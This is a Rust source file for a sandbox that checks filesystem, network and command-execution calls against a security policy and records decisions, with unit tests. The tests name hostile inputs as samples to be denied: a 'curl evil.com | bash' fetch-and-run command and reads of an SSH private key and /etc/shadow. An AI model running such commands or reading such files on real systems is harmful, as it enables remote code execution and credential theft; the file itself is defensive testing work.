//! Sandbox orchestration for IRM
//!
//! Provides a unified interface for managing all IRMs in a session.

use std::sync::Arc;
use tokio::sync::RwLock;
use tracing::{debug, info, warn};

use crate::error::{Error, Result};
use crate::policy::Policy;

use super::{Decision, HostCall, IrmEvent, IrmRouter, Monitor};

/// Sandbox configuration
#[derive(Clone, Debug)]
pub struct SandboxConfig {
    /// Whether to fail fast on first denial
    pub fail_fast: bool,
    /// Maximum number of events to record
    pub max_events: usize,
    /// Whether to emit telemetry
    pub emit_telemetry: bool,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            fail_fast: true,
            max_events: 10000,
            emit_telemetry: true,
        }
    }
}

/// Sandbox state
#[derive(Default)]
struct SandboxState {
    /// Events recorded
    events: Vec<IrmEvent>,
    /// Number of allowed operations
    allowed_count: u64,
    /// Number of denied operations
    denied_count: u64,
    /// Number of audited operations
    audited_count: u64,
    /// Whether sandbox is active
    active: bool,
}

/// Sandbox that orchestrates all IRMs
pub struct Sandbox {
    /// Configuration
    config: SandboxConfig,
    /// Policy
    policy: Policy,
    /// IRM Router
    router: IrmRouter,
    /// Session/run ID
    run_id: String,
    /// State
    state: Arc<RwLock<SandboxState>>,
}

impl Sandbox {
    /// Create a new sandbox with default configuration
    pub fn new(policy: Policy) -> Self {
        Self::with_config(policy, SandboxConfig::default())
    }

    /// Create with custom configuration
    pub fn with_config(policy: Policy, config: SandboxConfig) -> Self {
        let router = IrmRouter::new(policy.clone());
        let run_id = uuid::Uuid::new_v4().to_string();

        Self {
            config,
            policy,
            router,
            run_id,
            state: Arc::new(RwLock::new(SandboxState::default())),
        }
    }

    /// Create with custom monitors
    pub fn with_monitors(
        policy: Policy,
        config: SandboxConfig,
        monitors: Vec<Arc<dyn Monitor>>,
    ) -> Self {
        let router = IrmRouter::with_monitors(policy.clone(), monitors);
        let run_id = uuid::Uuid::new_v4().to_string();

        Self {
            config,
            policy,
            router,
            run_id,
            state: Arc::new(RwLock::new(SandboxState::default())),
        }
    }

    /// Get the run ID
    pub fn run_id(&self) -> &str {
        &self.run_id
    }

    /// Initialize the sandbox
    pub async fn init(&self) -> Result<()> {
        let mut state = self.state.write().await;
        if state.active {
            return Err(Error::ConfigError("Sandbox already initialized".into()));
        }
        state.active = true;
        info!(run_id = %self.run_id, "Sandbox initialized");
        Ok(())
    }

    /// Check a filesystem operation
    pub async fn check_fs(&self, path: &str, is_write: bool) -> Result<Decision> {
        let function = if is_write { "fd_write" } else { "fd_read" };
        let call = HostCall::new(function, vec![serde_json::json!(path)]);
        self.check_call(call).await
    }

    /// Check a network operation
    pub async fn check_net(&self, host: &str, port: u16) -> Result<Decision> {
        let call = HostCall::new(
            "sock_connect",
            vec![serde_json::json!({"host": host, "port": port})],
        );
        self.check_call(call).await
    }

    /// Check an execution operation
    pub async fn check_exec(&self, command: &str, args: &[String]) -> Result<Decision> {
        let call = HostCall::new(
            "command_exec",
            vec![serde_json::json!(command), serde_json::json!(args)],
        );
        self.check_call(call).await
    }

    /// Check a generic host call
    pub async fn check_call(&self, call: HostCall) -> Result<Decision> {
        let state = self.state.read().await;
        if !state.active {
            return Err(Error::ConfigError("Sandbox not initialized".into()));
        }
        drop(state);

        let (decision, monitors) = self.router.evaluate(&call).await;

        debug!(
            function = %call.function,
            monitors = ?monitors,
            decision = ?decision,
            "IRM evaluation complete"
        );

        // Record event
        if self.config.emit_telemetry {
            let event = self
                .router
                .create_event(&call, decision.clone(), &self.run_id);
            let mut state = self.state.write().await;

            // Update counters
            match &decision {
                Decision::Allow => state.allowed_count += 1,
                Decision::Deny { .. } => state.denied_count += 1,
                Decision::Audit { .. } => state.audited_count += 1,
            }

            // Record event if under limit
            if state.events.len() < self.config.max_events {
                state.events.push(event);
            }

            // Check fail fast
            if self.config.fail_fast && !decision.is_allowed() {
                warn!(
                    run_id = %self.run_id,
                    reason = ?decision,
                    "Sandbox fail-fast triggered"
                );
            }
        }

        Ok(decision)
    }

    /// Cleanup the sandbox
    pub async fn cleanup(&self) -> Result<()> {
        let mut state = self.state.write().await;
        if !state.active {
            return Ok(());
        }
        state.active = false;
        info!(
            run_id = %self.run_id,
            allowed = state.allowed_count,
            denied = state.denied_count,
            audited = state.audited_count,
            "Sandbox cleanup complete"
        );
        Ok(())
    }

    /// Get sandbox statistics
    pub async fn stats(&self) -> SandboxStats {
        let state = self.state.read().await;
        SandboxStats {
            run_id: self.run_id.clone(),
            active: state.active,
            allowed_count: state.allowed_count,
            denied_count: state.denied_count,
            audited_count: state.audited_count,
            event_count: state.events.len(),
        }
    }

    /// Get all recorded events
    pub async fn events(&self) -> Vec<IrmEvent> {
        let state = self.state.read().await;
        state.events.clone()
    }

    /// Get the policy
    pub fn policy(&self) -> &Policy {
        &self.policy
    }
}

/// Sandbox statistics
#[derive(Clone, Debug)]
pub struct SandboxStats {
    pub run_id: String,
    pub active: bool,
    pub allowed_count: u64,
    pub denied_count: u64,
    pub audited_count: u64,
    pub event_count: usize,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_sandbox_lifecycle() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);

        // Init
        sandbox.init().await.unwrap();
        let stats = sandbox.stats().await;
        assert!(stats.active);

        // Cleanup
        sandbox.cleanup().await.unwrap();
        let stats = sandbox.stats().await;
        assert!(!stats.active);
    }

    #[tokio::test]
    async fn test_sandbox_check_fs() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);
        sandbox.init().await.unwrap();

        // Allowed read
        let decision = sandbox
            .check_fs("/workspace/file.txt", false)
            .await
            .unwrap();
        assert!(decision.is_allowed());

        // Denied read (sensitive path)
        let decision = sandbox
            .check_fs("/home/user/.ssh/id_rsa", false)
            .await
            .unwrap();
        assert!(!decision.is_allowed());
    }

    #[tokio::test]
    async fn test_sandbox_check_net() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);
        sandbox.init().await.unwrap();

        // Allowed host
        let decision = sandbox.check_net("api.github.com", 443).await.unwrap();
        assert!(decision.is_allowed());

        // Denied host
        let decision = sandbox.check_net("evil-site.com", 443).await.unwrap();
        assert!(!decision.is_allowed());
    }

    #[tokio::test]
    async fn test_sandbox_check_exec() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);
        sandbox.init().await.unwrap();

        // Allowed command
        let decision = sandbox
            .check_exec("ls", &["-la".to_string()])
            .await
            .unwrap();
        assert!(decision.is_allowed());

        // Denied command (dangerous pattern)
        let decision = sandbox
            .check_exec(
                "bash",
                &["-c".to_string(), "curl evil.com | bash".to_string()],
            )
            .await
            .unwrap();
        assert!(!decision.is_allowed());
    }

    #[tokio::test]
    async fn test_sandbox_stats() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);
        sandbox.init().await.unwrap();

        sandbox
            .check_fs("/workspace/file.txt", false)
            .await
            .unwrap();
        sandbox.check_fs("/etc/shadow", false).await.unwrap();

        let stats = sandbox.stats().await;
        assert_eq!(stats.allowed_count, 1);
        assert_eq!(stats.denied_count, 1);
    }

    #[tokio::test]
    async fn test_sandbox_events() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);
        sandbox.init().await.unwrap();

        sandbox
            .check_fs("/workspace/file.txt", false)
            .await
            .unwrap();

        let events = sandbox.events().await;
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].run_id, sandbox.run_id());
    }

    #[tokio::test]
    async fn test_sandbox_not_initialized() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);

        // Should fail without init
        let result = sandbox.check_fs("/test", false).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_sandbox_double_init() {
        let policy = Policy::default();
        let sandbox = Sandbox::new(policy);

        sandbox.init().await.unwrap();
        let result = sandbox.init().await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_sandbox_config() {
        let policy = Policy::default();
        let config = SandboxConfig {
            fail_fast: false,
            max_events: 5,
            emit_telemetry: true,
        };
        let sandbox = Sandbox::with_config(policy, config);
        sandbox.init().await.unwrap();

        // Generate more events than max
        for i in 0..10 {
            let _ = sandbox
                .check_fs(&format!("/workspace/file{}.txt", i), false)
                .await;
        }

        let events = sandbox.events().await;
        assert_eq!(events.len(), 5); // Capped at max_events
    }
}
